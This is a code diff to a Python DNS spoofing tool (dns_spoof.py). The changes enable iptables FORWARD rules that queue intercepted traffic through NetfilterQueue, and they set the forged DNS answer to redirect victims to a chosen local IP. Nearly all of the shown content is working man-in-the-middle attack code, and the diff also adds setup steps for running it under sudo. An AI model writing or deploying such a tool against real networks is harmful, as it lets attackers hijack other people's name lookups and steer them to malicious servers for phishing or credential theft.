@@ -1,7 +1,21 @@
 #!/usr/bin/env python3
-import netfilterqueue
-import scapy.all as scapy
 import sys, os, subprocess
+try:
+    import scapy.all as scapy
+    from netfilterqueue import NetfilterQueue
+except ImportError as e:
+    print("\n[-] Dependency Error: Virtual Environment missing or incomplete.")
+    print(f"    Specific missing module: {e}")
+    print("\n[*] Please follow these steps to fix the environment:")
+    print("\n    1. Create the virtual environment in the parent directory:")
+    print("       python3 -m venv ../venv")
+    print("\n    2. Activate it and install the required tools:")
+    print("       source ../venv/bin/activate")
+    print("       pip install scapy NetfilterQueue")
+    print("\n    3. Run the script using the specific venv python path:")
+    print("       sudo ../venv/bin/python3 dns_spoof.py\n")
+    
+    sys.exit()
 
 
 def root_check():
@@ -13,12 +27,14 @@ def root_check():
 
 def iptable_insert():
     try:
+        '''
+        for internal testing
         subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
         subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
+        or for external testing
         '''
-        or
         subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
-        '''
+        
         print("[*] Iptables intercepting rule inserted")
     except Exception as e:
         print(f"[!] Error inserting iptables rule: {e}")
@@ -43,7 +59,7 @@ def process_packet(packet):
             spoofed_ips.add(scapy_packet[scapy.IP].dst)
 
             # Forge the DNS response
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.3") # Change the IP of the server to redirect to
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.196") # Change the IP of the server to redirect to
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
